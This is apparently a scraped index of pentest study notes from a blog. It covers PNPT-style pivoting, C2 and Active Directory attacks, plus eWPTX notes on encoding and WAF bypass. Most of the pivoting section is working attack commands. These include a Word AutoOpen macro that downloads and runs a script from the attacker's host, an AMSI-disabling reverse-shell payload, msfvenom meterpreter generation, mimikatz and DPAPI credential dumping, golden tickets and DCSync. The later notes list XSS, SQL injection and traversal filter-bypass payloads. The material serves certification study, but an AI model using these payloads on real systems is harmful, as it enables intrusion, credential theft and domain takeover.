have access back to our kali machine.    In meterpreter session:  portfwd add -R -p 1234 -l 443 -L &lt;kali ip&gt;  # -R = reverse # -p = port of target machine, doest not matter # -l = port in our kali # -L = listening host = kali ip  portfwd  # to show the total active port forwards ctrl + z # background the session    SOCKS  search socks use auxiliary/server/socks4a cat /etc/proxychains4.conf &gt; copy the port in the socks4 line example: socks4 127.0.0.1 9050 set the port we check in proxychains4 exploit -j  jobs jobs -k &lt;number&gt; = if u want to kill   portfwd # pay attention to the info example : &lt;kali ip&gt;:443   0.0.0.0:1234  # Go to covenant &amp; create a listener to interact with that port forward Listeners &gt; name=Reverse HTTP &gt; BindPort=443 &gt; ConnectPort=1234 &gt; ConnectAddresses=target ip Create      To visualize: go to msfconsole &gt; netstat -ano there is a service 0.0.0.0:1234 LISTEN powershell.exe that service will capture the traffic and push off over to our kali machine    Launchers &gt; powershell &gt; reverse http &gt; Net40 &gt; Generate Host &gt; /rev.ps1 &gt; click host &gt; copy the encoded payload   POC  - Go to workstation-02, that we do not have directly access. - disable AV  - paste the payload, we should get a session in Covenant      If u try to generate again without port forward this will not work    Launchers &gt; Generate HTTP Listener &gt; Host &gt; rev.ps1 - host &gt; copy encoded payload  try to execute in the workstation-02   ProxyChains  proxychains evil-winrm -u &lt;user&gt; -p 'password' -i &lt;ip of workstation-02&gt;  # we get a shell # without the portfwd in the meterpreter, this will not work    Workstation Dominance   Dumping Hashes  You need a high integrity Covenant Shell if you are not authority\\system we need to run token::elevate   Mimikatz in Covenant Shell:  Mimikatz token::elevate lsadump::secrets      Here we are looking for plain text credentials    Mimikatz token::elevate lsadump::sam      Here we want hashes Covenant store the hashes we found in Data - Credentials    Metasploit:  run post/windows/gather/win_privs getsystem getuid  # if u are authority\\system: hashdump &gt; grab to crack later load kiwi # to use mimikatz in meterpreter help # to see available commands  creds_all lsa_dump_sam lsa_dump_secrets   Cracking Credentials   Hashcat:  hashcat.exe -a 0 -m 1000 &lt;hash&gt; -r &lt;rule file&gt; &lt;wordlist&gt;  # -m 1000 = NTLM   → https://hashcat.net/wiki/doku.php?id=example_hashes   → https://github.com/NotSoSecure/password_cracking_rules   Cracking Vault with Covenant:   First enable RDP in DC.   in Workstation-01:  Control Panel\\User Accounts\\Credential Manager      If someone log in the DC For example, the credential will be stored in the credential manager. We cant see the password, but its stored there… What that means? means that we can get.    In Covenant Shell: Workstation-01 - medium integrity:  mimikatz vault::cred   To find where the credentials are:  ls c:\\users\\&lt;user.domain&gt;\\appdata\\local\\microsoft\\credentials grab the full path   Open another Covenant Shell in a new tab:  Grunts &gt; shell &gt; Task &gt; Mimikatz &gt; \"dpapi::cred /in:&lt;paste full path from credentials&gt;\" &gt; Task grab the guidMasterKey   ls C:\\users\\&lt;user.domain&gt;\\appdata\\roaming\\microsoft\\protect # then ls the full path result # this should show the guidMasterKey &gt; copy the full path &amp; compare with the guidMasterKey from before  Grunts &gt; shell &gt; Task &gt; Mimikatz &gt; \"dpapi::masterkey /in:&lt;full path of guidMasterKey&gt; /rpc\" &gt; Task  # rpc = remote procedure call # in the end of the output we should find the key value of DC &gt; copy &amp; save the key  # Go back to Task &gt; \"dpapi::cred /in:&lt;full path of credentials&gt; /masterkey:&lt;key value&gt;\" &gt; Task      This will dump the plain text password of the account that was stored in Credential Manager In this case, its the DC.    Cracking Vault via Metasploit   in meterpreter shell:  upload &lt;mimikatz.exe&gt; C:\\\\Users\\\\Public\\\\mimikatz.exe shell cd c:\\users\\public  dir /a C:\\users\\&lt;user.domain&gt;\\appdata\\local\\microsoft\\credentials # it should show the key path  mimikatz.exe vault::cred  dpapi::cred /in:&lt;credential path&gt;\\&lt;key path&gt; # it should show the guidMasterKey exit (mimikatz)  dir /a C:\\users\\&lt;user.domain&gt;\\appdata\\roaming\\microsoft\\protect dir /a C:\\users\\&lt;user.domain&gt;\\appdata\\roaming\\microsoft\\protect\\&lt;SID directory&gt; grab the guidMasterKey  mimikatz.exe dpapi::masterkey /in:&lt;full path of guidMasterKey&gt; /rpc # it should show the master key value that we need to crack  dpapi::cred /in:&lt;full path of credentials&gt; /masterkey:&lt;key value&gt; # it dumps the password   [+] 101   It looks complicated but its not.   There is 4 steps:  1. Get the key path: run dir in appdata\\local\\microsoft\\credentials  2. Get the guidMasterKey full path: its in appdata\\roaming\\microsoft\\protect\\&lt;SID&gt; we just need to find the SID directory running DIR   3. Discover the key value: mimikatz.exe dpapi::masterkey /in:&lt;full path of guidMasterKey&gt; /rpc  4. Crack the key value: dpapi::cred /in:&lt;full path of credentials&gt; /masterkey:&lt;key value&gt;   Dumping Firefox Credentials  workstation-01 - first open firefox and save a credential of any site   Metasploit  background your session   search firefox:  use post/multi/gather/firefox_creds set session exploit -j      it will save the firefox credentials dump in /root/.msf4/loot/    We need to rename the dump files:  cert &gt; cert9.db key4 &gt; key4.db logi &gt; logins.json cook &gt; cookies.sqlite  sign &gt; signons.sqlite # optional   /opt/ git clone https://github.com/unode/firefox_decrypt ./firefox_decrypt.py /root/.msf4/loot/ # it will dump all the credentials saved in FIrefox   To check if firefox is in the machine and u may wanna try this exploit   in meterpreter session:  run post/windows/gather/enum_applications   Bypassing Defender with FodHelper  - Go to workstation-01 - Enable all protection except Automatic sample Submission   Disable AMSI and Gain reverse shell:  AMSI = anti malware scanning interface from windows      we are gonna use FodHelper to break it.    Covenant:  - make sure ip address is correct and you paste the revshell payload from covenant - We need to host a file (in this case banana.txt) in covenant   banana.txt content:  iex (New-Object Net.WebClient).DownloadString('http://&lt;kali ip&gt;/helper.ps1');helper -custom \"cmd.exe /c powershell New-Item 'HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFF}' -Force; Remove-Item -Path 'HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}' -Recurse; cmd.exe /c &lt;powershell reverse shell&gt;\"   Benefits.doc - Macro Word File:  Sub FruitLoops()   Dim wsh As Object   Set wsh = CreateObject(\"WScript.Shell\")   wsh.Run \"powershell iex (New-Object Net.WebClient).DownloadString('http://&lt;kali ip&gt;/banana.txt')\"   Set wsh = Nothing End Sub Sub AutoOpen()   FruitLoops End Sub   We need to host 2 files - the exploit and the helper.ps1:  Listener &gt; host &gt; /banana.txt &gt; browser &gt; select file &gt; create Listener &gt; host &gt; /helper.ps1 &gt; browser &gt; select file &gt; create   in Workstation-01:  iex (New-Object Net.WebClient).DownloadString('http://&lt;kali ip&gt;/banana.txt')      Windows defender will not get our exploit, cause we bypassed we should get high integrity shell in Covenant    in Covenant Shell:  whoami Mimikatz token::elevate lsadump:sam   Go back to workstation-01 &gt; rename back to the original file  &gt; register &gt; HKLM\\software\\microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}      c:\\Shared\\Benefits.doc = the malicious macro file      it will change de register file again. and we will gain shell from covenant again    Domain Enumeration   Downloading Files      With Powershell   In Covenant:  Listeners &gt; Hosted Files &gt; Create &gt; /powerview.ps1 &gt; browser &gt; select PowerView.ps1 &gt; Create   Download the hosted File:  certutil.exe -urlcache -f http://&lt;kali ip&gt;/powerview.ps1 powerview.ps1 wget http://&lt;kali ip&gt;/powerview.ps1 -OutFile powerview.ps1 iex (New-Object Net.WebClient).DownloadString('http://&lt;kali ip&gt;/powerview.ps1');get-netcomputer      iex does not download the file, however it loads into memory.  so we can execute commands of powerview in this case.    Enumerating Users  First download powerview.ps1:  get-netuser get-netuser | select cn get-netuser | select -expandproperty samaccountname find-userfield -SearchField description \"password\"   Enumeration Local Admin Users:  Invoke-EnumerateLocalAdmin   Enumerating Groups  powerview.ps1:  get-netgroup get-netgroup -UserName \"&lt;user&gt;\" get-netgroup -GroupName \"&lt;group&gt;\" -FullData   Enumerating Domain Computers  powerview.ps1:  get-netcomputer get-netcomputer -Full-Data get-NetComputer -OperatingSystem \"*Windows 10\" get-NetComputer -OperatingSystem \"*server\"    Shares:  Invoke-ShareFinder Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC  Files:  Invoke-FileFinder   Enum GPO / ACL   Enumerating Group Policy Objects (GPO):  get-netgpo   Enumerating Access Control Lists (ACL):  get-objectacl get-objectacl -SamAccountName \"engineering\" -ResolveGUIDs net group sales /domain net group &lt;group&gt; /domain net users &lt;user&gt; /domain  net group &lt;group&gt; &lt;user you wanna delete from the group&gt; /del /domain net group &lt;group&gt; &lt;user you wanna add in the group&gt; /add /domain      If we can add another user to some group, we can add ourselves to a group to gain access to files/directories    Enumerating the Domain:  get-netdomain get-domainpolicy get-domainsid   Powershell Remoting   Login another machine remotely:  Enter-PSSession -ComputerName workstation-02 -Credential &lt;domain\\user&gt;   Executing a command remotely:  Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName &lt;pc&gt; -Credential &lt;domain\\user&gt;   Movement, Pivoting and Persistence in the Domain   Necessary Domain Misconfigurations  in DC &gt; folders &gt; delegate control &gt; add IT admin group &gt; check all delegations.  GPO manager &gt; computer &gt; Policies &gt; Administrative Templates &gt; System &gt; Credential Delegation Restrict delegation of credentials to remote server &gt; disabled   Overview Bloodhound      Bloohound is a good tool to show us a visual landscape of the domain network. it shows the hierarchy connection between nodes until the domain controller    in Covenant shell ( medium integrity ):  ChangeDirectory C:\\Users\\Public upload &gt; path=C:\\users\\public\\sharphound.exe &gt; browse &gt; select SharpHound.exe   Bloodhound  In Covenant:  shell sharphound.exe -c all = this will capture all domain objects sharphound saves into a zip file, go ahead and copy the file name download &lt;bloodhound.zip&gt; click in the file inside covenant &gt; save file   in kali:  apt install bloodhound neo4j neo4j console go to localhost:7474 and change de password [ default &gt; neo4j:neo4j ] bloodhound   In BloodHound:  drag and drop the bloodhound.zip that we got earlier Database info Analysis &gt; Find all domain Admins Analysis &gt; Find Shortest Paths to Domain Admins &gt; click in connection GenericAll &gt; help &gt; abuse info   Abusing ACLs  upload powerview_dev,ps1 to the target windows machine   load powerview_dev  . .\\powerview_dev.ps1 net user &lt;user1&gt; /domain net group engineering &lt;user1&gt; /add /domain = we are adding our user to another group, to gain more access net group \"IT ADMINS\" &lt;user1&gt; /add /domain = gaining more access      How to know which group to add ourselves? with bloodhound, it shows which group has genericAll access, that allow us to move laterally within groups until there is another set of vulnerabilities we can exploit    Now that we have more access, we are gonna force a password change by another user:  $SecPassword = ConvertTo-SecureString 'password of user1' -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential('domain\\user1', $SecPassword) $UserPass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force Set-DomainUserPassword -Identity &lt;user2&gt; -AccountPassword $UserPass -Credential $cred  net user &lt;user2&gt; /domain # I can see that user2 is a member of Administrator, he has WriteDacl rights to DC  Enter-PSSession -ComputerName dc01 -Credential &lt;domain\\user2&gt; # We just opened a session in DC with the new credentials we created by force of user2   In this new Covenant DC01 session:  net group \"Domain admins\" &lt;user2&gt; /add /domain net user &lt;user2&gt; /domain      We are part of domain admins group in the DC    Pivoting through Remote Desktop via Compromised Host  Create a local account For  first, grant local admin privileges, and then log in as **user2** locally. This will simulate the user as a help desk/technician logging in to service the machine and the hash being cached   Log as user2 in workstation-01:  &gt; logout &gt; log as user1  open powershell as administrator &gt; send revshell to Covenant listener  # because we need high integrity shell   in Covenant shell:  mimikatz token::elevate lsadump::sam grab the hashes from user2 crack the hashes &gt; john hashes.txt --format=nt -w=/rockyou.txt  Now that we have the password of user2 we can pivot from 'user1-workstation-01' to 'user2-workstation-02' # we can log in user1 and RDP to user2 For example      Now that we are inside workstation-02 using user2 we can pivot to DC01 using user2 because he has access; we can see that in Bloodhound    Configuring Reverse Port Forward  msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=&lt;kali ip&gt; lport=25 -f raw -o msf.bin   In Metasploit:  use exploit/multi/handler set options exploit -j   In Covenant:  Launchers &gt; powershell &gt; net40 &gt; HTTP Listener &gt; copy the encoded payload Grunts &gt; high integrity shell &gt; ps find a process that has SessionID&gt;0, doesnt need to be authority\\system inject &lt;PID&gt; &gt; browser &gt; msf.bin  # a wild session appears in msf   Meaning behind that:      we have covenant session, but we found another network and want to portfwd to enum these networks. So we will pass the session to meterpreter via covenant, we dont have GUI access here. In meterpreter session we can run autoroute, portfwd and SOCKS.    In Meterpreter session:  ipconfig run autoroute -s &lt;target network/24&gt;       the target network is one that we dont have access and we need this portfwd to gain that    run autoroute -p portfwd add -R -p 2222 -l 443 -L &lt;kali ip&gt; portfwd background the session = ctrl+z  search socks use auxiliary/server/socks4a set srvport = the same as in /etc/proxychains4.conf exploit -j      Done, now we will generate traffic from this internal network to our kali.    workstation-02 &gt; workstation-01 &gt; kali the traffic will pass through workstation-01 that we have directly access.   Gaining a Shell on an Internal Workstation  In Covenant:  Listeners &gt; create &gt; Reverse HTTP &gt; BindPort=443(port we are listening) &gt; ConnectPort=2222 &gt; ConnectAddresses=&lt;workstation-01 IP&gt; &gt; create  Launchers &gt; powershell &gt; Reverse HTTP &gt; net40 &gt; Generate Host &gt; /rev1.ps1 &gt; Host &gt; Copy encoded payload   In Metasploit:  use exploit/windows/smb/psexec set options # but we dont know the RHOSTS of worksation-02  # we can open the session of workstation-01 and ping workstation-02 to know the IP set payload windows/x64/exec set cmd &lt;paste the payload of covenant here&gt; exploit -j      we should gain a shell in the Covenant Listener its SYSTEM integrity but SessionID=0 we can try to improve to a SessionID=1    Remoting Through ProxyChains  In Covenant system shell:  PowerShellRemotingCommand &lt;computername&gt; &lt;\"command\"&gt; &lt;domain&gt; &lt;username&gt; &lt;password&gt; \"command can be reverse http from listener\" # we should get a shell with high integrity and user2 access.   in Kali:  proxychains xfreerdp /u:&lt;user2&gt; /p:'Password123!' /v:&lt;workstation-02 IP&gt; /d:&lt;domain&gt;      In order to this process work: we need socks proxy set in metasploit, autoroute and portfwd too cause we are accessing a machine in another network.       gain access to workstation-02   we can go further and pivot to DC01 through Remote Desktop   Unconstrained Delegation      [Note] that the following command needs to be ran from an Administrator/elevated Powershell prompt on DC01 as well prior to doing this lesson    Get-ADComputer -Identity Workstation-02 | Set-ADAccountControl -TrustedForDelegation $true   Bloodhound:  analysis &gt; shortest paths to unconstrained delagation systems   In Covenant system/0 shell:  upload &gt; C:\\users\\public\\ms-rprn.exe &gt; browser &gt; select ms-rprn.exe &gt; execute ChangeDirectory C:\\users\\public shell ms-rprn.exe \\\\TargetServer \\\\targetHost PowerShellImport &gt; PowerView_dev.ps1 Powershell get-netcomputer -unconstrained -properties dnshostname # it shows the hostnames that have unconstrained delegation   shell ms-rprn.exe \\\\DC01 \\\\workstation-02 rubeus dump /service:krbtgt # copy the Base64EncodedTicket from DC01$  # take the spaces off  maketoken administrator &lt;domain&gt; &lt;whateverForPassword&gt;  # copy the kerberos ticket rubeus ptt /ticket:&lt;paste the ticket&gt;  # Output: [+]  Ticket Successfully imported!      This means this session is acting as domain controller, we have full domain rights    POC - Create a user and add him to Domain Admins group:  shell net users /domain shell net user &lt;user3&gt; 'password' /add /domain shell net group \"Domain Admins\" &lt;user3&gt; /add /domain shell net user user3 /domain   To dump the full SAM account of krbtgt:  dcsync &lt;domain\\krbtgt&gt;   Golden TIcket Persistence  workstation-01 Covenant shell:  # Upload &gt; C:\\users\\public\\ invoke-mimikatz.ps1 powerview.ps1   cd C:\\users\\public . .\\powerview.ps1 get-domainsid . .\\invoke-mimikatz.ps1 Invoke-Mimikatz -Command '\"kerberos::golden /user:administrator /domain:&lt;domain&gt; /sid:&lt;get-domainsid output&gt; /krbtgt:&lt;kerberos ticket, maybe its saved in Covenant - Data&gt; /ptt\"' # ptt = pass the ticket    At this point we are administrator of the DC - free access:  ls \\\\dc01\\c$ net group \"domain admins\" &lt;user4&gt; /add /domain   Reverse Port Forwarding for Shell on DC01  Make sure WDefender are off   We need to have 3 listener in Covenant:  1: HTTP Listener / ConnectAddress= kali ip / Port=80  #External = its used to get workstation-01 access  2: Reverse HTTP / ConnectAddress= workstation-01 / port=2222 / bindport=443 # Internal - its used to get workstation-02 access through workstation-01 portfwd  3: reverse listener2 / ConnectAddress=workstation-01(secure) / port=2223 / binport=8082 # Secure - its used to get domain access through workstation-01 portfwd  # Create a powershell launcher \\for each of the listeners   msfconsole:  use exploit/multi/script/web_delivery set target 2 = \\for powershell set payload windows/x64/meterpreter/reverse_tcp set lhost, lport exploit -j # copy the payload and run in workstation-01  ipconfig      Here we can see, that we need to setup 2 routes.  Cause there is 2 more networks besides the external one.       external - internal - secure    meterpreter session:  run autoroute -s &lt;internal network ip = 192.168.16.0/24&gt; run autoroute -s &lt;secure network ip = 10.120.116.0/24&gt;  portfwd add -R -p 2222 -l 443 -L &lt;kali ip&gt; portfwd add -R -p 2223 -l 8082 -L &lt;kali ip&gt; portfwd # to show the port forwards actives # backgroud the session   use exploit/windows/smb/psexec  set smbdomain, smbuser, smbpass, payload=windows/x64/exec, rhost set cmd &lt;Reverse HTTP payload from covenant&gt; exploit      get a shell back from covenant - workstation-02 System    set rhosts &lt;DC IP&gt; = we can get the ip by pinging DC01 from workstation-01 set cmd &lt;reverse listener2 payload from covenant exploit      get a shell back from covenant - DC01 - System    ","categories": ["notes","pnpt"],
        "tags": ["begginer","pentest","pivot","c2","AD"],
        "url": "/notes/pnpt/wpivoting/",
        "teaser": "/assets/images/posts/pnpt/pnpt-teaser5.jpg"
      },{
        "title": "Web application Penetration Tester eXtreme ",
        "excerpt":"     My Review                  Difficulty: ★★★☆☆                         Price: ★★★☆☆       $400                 Material: ★★★☆☆                         Real-World Scenario: ★★★☆☆                         Worth it?: Yes, If you want to specialize in Web Pentesting.                         Official Site: eWPTX by INE                      WEB oriented there is eWPTX and OSWE. The first being Black-box and the second White-box       As all INE content, I think this course can be updated       Maybe in the future I’ll try the exam.   ","categories": ["review"],
        "tags": ["advanced","pentest","web","review"],
        "url": "/review/eewptx/",
        "teaser": "/assets/images/posts/ewptx/ewptx-teaser1.jpg"
      },{
        "title": "1 - Encoding & Filtering",
        "excerpt":"  Data Encoding Basics   URL encoding   This table is a character encoding chart that is useful in explaining which characters are “safe” and which characters should be encoded in URLs.      http://perishablepress.com/stop-using-unsafe-characters-in-urls/   Some commonly encoded characters are:                  Character       Purporse in URL       Encoding                 ’#’       Separate anchors       %23                 ’?’       Separate query string       %3F                 ‘&amp;’       Separate query elements       %24                 ’%’       Indicates an encoded character       %25                 ’/’       Separate domain and directories       %2F                 ’+’       Indicates a space       %2B                 ‘'       Not recommended       %20 or +           HTML encoding   Documents transmitted via HTTP can send a charset parameter in the header to specify the character encoding of the document sent. This is the HTTP header: Content-Type  Content-Type:text/html;charset=utf-8   Define character encoding using HTTP  # PHP &gt; Uses the header() function to send a raw HTTP header: header('Content-Type:text/html;charset=utf-8')  # ASP.Net &gt; Uses the response object: &lt;%Response.charset=\"utf-8\"%&gt;  # JSP &gt; Uses the page directive: &lt;%@ page contentType=\"text/html; charset=UTF-8\"%&gt;   # Using directive META: &lt;meta http-equiv=\"Content-Type\" Content=\"text/html;charset=utf-8\"&gt;  # With HTML5, is also possible to write: &lt;meta charset=\"utf-8\"&gt;   HTML4 and HTML5 specifications about special characters  http://www.w3.org/TR/1998/REC-html40-19980424/charset.html#h-5.3   http://www.w3.org/TR/html5/single-page.html#character-references      Named characters references:   → http://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references#Character_entity_references_in_HTML   Characters references must start with a U+0026 AMPERSAND character (&amp;):                  CHaracter Reference       Rule       Encoded character                 Named entity       &amp; + named character references + ;       &amp;It;                 Numeric Decimal       &amp; + # +  + ;       &#60;                 Numeric Hexadecimal       &amp; + #x +  + ;       &#x3c; / &amp;#X3C;           Some Variations:                  CHaracter Reference       Variation       Encoded character                 Numeric Decimal       No terminator (;)       &#60;                         One or more zeroes before code       &amp;#060 / &amp;#0000060                 Numeric Hexadecimal       No terminator (;)       &amp;#x3c                         One or more zeroes before code       &amp;#0x3c / &amp;#00003c           Base (36|64) encoding   Base 36 Encoding Scheme  Base36 - Its the most compact, case-insensitive, alphanumerical system using ASCII characters. In fact, the schemes alphabet contains all digits [0-9] and Latin letters [A-Z]      Its used in many real-world scenarios      Reddit used if For identifying both posts and comments   Some URL shortening services like TinyURL use Base36 integer as compact, alphanumeric identifiers.   → http://tinyurl/ljasd   PHP  PHP uses the base_convert() function to convert numbers:  OHPE is Base 10 is &lt;?=base_convert(\"OHPE\",36,10);?&gt;   JavaScript JavaScript used two functions:  (1142690.toString(36) 1142690..toString(36) #encode parseInt(\"ohpe\",36)   #decode   Base64 Encoding Scheme  Base64 is one of the most widespread binary-to-text encoding schemes to date. It was designed to allow binary data to be represented as ASCII string text.         The alphabet of the Base64 encoding scheme is composed of digits [0-9] and Latin letters, both upper and lower case [a-zA-Z], For a total of 62 values. To complete the character set to 64 there are the plus (+) and slash (/) characters.   Moreover: http://en.wikipedia.org/wiki/Base64#Implementations_and_history   The algorithm divides the message into groups of 6 bits* and then converts each group, with  the respective ASCII character, following the conversion table.            Thats why the allowed characters are 64 (2 raised to 6th power = 64)      If the lastest gruop is null(000000) the respective encoding value is =   If the traiing null groups are two, then will be encoded as ==   PHP PHP used base64_encode and base64_decode functions based on MIME Base64 implementation:  &lt;?=base64_encode('encode this string')?&gt; //encode &lt;?=base64_decode('ZW5jb2RlIHRoaXMgc3RyaW5n')?&gt; //decode   JavaScript Many browsers can handle base64 natively through function btoa and atob:  window.btoa('encode this string'); //encode window.atob('ZW5jb2RlIHRoaXMgc3RyaW5n'); //decode  Moreover: https://developer.mozilla.org/en-US/docs/Web/API/Window.btoa   Unicode encoding   Unicode aka ISO/IEC 10646 Universal Character Set. It can expose web applications to possible security attacks, like bypass filters.      http://www.joelonsoftware.com/articles/Unicode.html         UTF = Unicode Transformation Format:  - UTF-8 - UTF-16 - UTF-32   Homoglyph | Visual Spoofing  In typography, a Homoglyph is one or two or more characters, or glyphs, with shapes that either appear identical or cannot be differentiated by quick visual inspection. -Wikipedia   Homograph - a word that looks the same as another word Homogliph - a look-like character used to create homographs  Example: Visual Sp'oo'fing = U+006F (Latin small letter o) U+03BF (Greek small letter omicron)        Moreover Confusables: http://unicode.org/cldr/utility/confusables.jsp   Homoglyph Attack Generator: http://www.irongeek.com/homoglyph-attack-generator.php   Article about Homoglyph and Punycode attacks: http://www.irongeek.com/i.php?page=security/out-of-character-use-of-punycode-and-homoglyph-attacks-to-obfuscate-urls-for-phishing   They can bypass anti cross-site scripting and SQL Injection filters;      Create usernames and Spotify account hijacking: http://labs.spotify.com/2013/06/18/creative-usernames/      There are other ways in which characters and strings can be transformed by software processes, such as normalization, canonicalization, best fit mapping, etc          → Moreover: http://websec.github.io/unicode-security-guide/   Extra Resources  - http://unicode.org/cldr/utility/ - http://codepoints.net/ - http://txtn.us/ - http://www.panix.com/~eli/unicode/convert.cgi   Multiple (De|En) Codings      Its common to abuse multiple encodings to bypass security measures     URL-Encoding &gt; URL           Filtering Basics      A common, yet often recommended, best practice to protect web applications against malicious attacks is the use of specific input filtering and output encoding controls.    These kings of controls may range from naive blacklists to experienced and higly restrictive whitelists. What about in the real world? We are somewhere in the middle!      Control can be implemented at different layers in a web application. They can be represented as either libraries and APIs, or in the best case, by internal specialits or external organizations, like ESAPI by OWASP.   https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API   Security Controls are also inside most common browsers.   Generally, these solutions fall into the IDS and IPS world, but FOr Web Applications, the most chosen are the Web Application Firewall (WAFs)   A free and open source solution: http://www.modsecurity.org/   Regular Expressions (RE or RegEx)     Represents the official way used to define the filter rules. Mastering RegEx is fundamental to understand how to bypass filters because RE are extremely powerful.   Its a special sequence of characters used For describing a search pattern.   → regular expression = regex   → pattern matched = match   Two main types     DFA = http://en.wikipedia.org/wiki/Deterministic_finite_automaton   NFA = http://en.wikipedia.org/wiki/Nondeterministic_finite_automaton                  Engine       Program                 DFA       awk, egrep, MySQL, Procmail                 NFA       .NET languages, Java, Perl, PHP, Python, Ruby, PCRE library, vi, grep, less, more           Comparison of regular expression engines: http://en.wikipedia.org/wiki/Comparison_of_regular_expression_engines   Regular Expression Flavor Comparison: http://www.regular-expressions.info/refflavors.html   Non-printing characters:  its used to evade bad filters and obfuscate the payload.   Match Unicode Code Point:  Regular expression flavors that work with Unicode use specific meta-sequences to match code points. The sequence is \\ucode-point, where code-point is the hexadecimal number of the character to match.  There are regex flavors like PCRE that do not support the former notation,  but use an alternative sequence \\x{code-point} in its place.   example:  \\u2603   = the snowman character in .NET, Java, Javascript and Python \\x{2603} = the snowman character in Apache and PHP (PCRE library)   Meta-sequence Quality:  \\p{quality-id} = have a specific quality \\P{quality-id} = do not have quality   Match Unicode Category:  # To match the string with all the case variations (lower, upper and title), this regex does the job: [\\p{Ll}\\p{Lu}\\p{Lt}]  # As a shorthand, some regex flavors implement this solution: \\p{L&amp;}   Web Application Firewal - WAF   ByPass WAFs  |-| = instead of using this |→| = the best choice is   Cross-Site Scripting:  - alert('xss')  - alert(1) → prompt('xss')  → prompt(8) → confirm('xss') → confirm(8) → alert(/xss/.source) → window[/alert/.source](8)  - alert(document.cookie)  → with(document)alert(cookie)  → alert(document['cookie']) → alert(document[/cookie/.source]) → alert(document[/coo/.source+kie/.source])  - &lt;img src=x onerror=alert(1);&gt; → &lt;svg/onload=alert(1)&gt; → &lt;video src=x onerror=alert(1);&gt; → &lt;audio src=x onerror=alert(1);&gt;  - javascript:alert(document.cookie) → data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=   Blind SQL Injection  - 'or 1=1           ' - 'or 6=6           ' → 'or 0x47=0x47     ' - or char(32)='' → or 6 is not null   SQL Injection  - UNION SELECT → UNION ALL SELECT   Directory Traversal  - /etc/passwd → /too/../etc/far/../passwd → /etc//passwd → /etc/ignore/../passwd → /etc/passwd........   Web Shell  - c99.php - r57.php - shell.aspx - cmd.jsp - CmdAsp.asp → augh.php   Detection and Fingerprinting   Cookie Values     Citrix Netscaler uses some different cookies in the HTTP responses like ns_af or citrix_ns_id or NSC_   F5 BIG-IP ASM (Application Security Manager) uses cookies starting with TS and followed with a string that respect the following regex:   ^TS[a-z-A-Z0-9]{3,6}      Barracura uses two cookies barra_counter_session and BNI__BARRACUDA_LB_COOKIE   Header Rewrite  Some WAFs rewrite the HTTP headers. Usually these modify the Server Header to deceive the attackers.   HTTP Response Code  Some WAFs modify the HTTP response codes if the request is hostile;  For example:  - mod_security       &gt; 406 Not Acceptable → AQTRONIX WebKnight &gt; 999 No Hacking   HTTP Response Body  its also possible to detect in the response body   Example:                  &lt;body&gt;       &lt;body&gt;                 …Mod_Security…       …AQTRONIX WebKnight …                 &lt;/body&gt;       &lt;/body           dotDefender Blocked your Request   Close Connection  its useful in dropping the connection in the case the WAF detects a malicious request      mod_security   Detect WAF  wafw00f is a tool written in python that can detect up to 20 different WAF products      wafw00f  - https://code.google.com/p/waffit/   The techniques used to detect a WAF are similar to those we have seen previously:      Cookies   Server Cloaking   Response Codes   Drop Action   Pre-Built-in Rules      Nmap contains a script that tries to detect the presence of a web application fireall, its type and version. http://nmap.org/nsedoc/scripts/http-waf-fingerprint.html   → nmap –script=http-waf-fingerprint  -p 80      imperva-detect = https://code.google.com/p/imperva-detect/   Client-Side Filters  Browsers are the primary mean used to address client-side attacks   Browser Add-ons  NoScript Security Suite is a whitelist-based security tool that basically disables all the executable web content (Javascript, Java, Flash, Silverlight, …) and lets the user choose which sites are trusted, thus allowing the use of these technologies.   → https://addons.mozilla.org/en-US/firefox/addon/noscript/      http://noscript.net/features#xss is effect browser-based solutions to prevent targeted malicious web attacks.   XSS Filter (IE)  c:\\windows\\system32\\mshtml.dll library. Ways to inspect:  # Hex editors like WinHex. Notepad++ with TextFX plugin # IDAPro # MS-DOS commands  findstr /C:\"sc{r}\" \\WINDOWS\\SYSTEM32\\mshtml.dll | find \"{\" &gt; savepath //u can save to a file For more readable results   Neutering in Action  Basically, once a malicious injection is detected, the XSS Filter modified the evil part of the payload by adding the ‘#’ character in place of the neuter chracter, defined in the rules.   evil &gt; ev{i}l &gt; ev#l &lt;svg/onload=alert(1)&gt; = &lt;svg/#nload=alert(1)&gt;   Web sites that chose to opt-out of this protection can use the HTTP response header:  X-XSS-Protection: 0 X-XSS-Protection: 1; mode=block //instead of sanitize the page, will render a simple # # others browsers like safari, used the same scheme   XSS Auditor - WebKit/Blink     http://www.adambarth.com/papers/2010/bates-barth-jackson.pdf   enabled by default in browsers such as: chrome, opera and safari   THe filter analyzes both the inbound requests and the outbound. If, in the parsed HTML data, it finds executable code within the response, then it stops the script and generates a console alert similar to the following. The XSS Auditor refused to execute a script in …      however there is a lot of bypasses aswell    ","categories": ["notes","ewptx"],
        "tags": ["advanced","pentest","web"],
        "url": "/notes/ewptx/encoding/",
        "teaser": "/assets/images/posts/ewptx/ewptx-teaser2.jpg"
      },{
        "title": "2 - Evasion Basics",
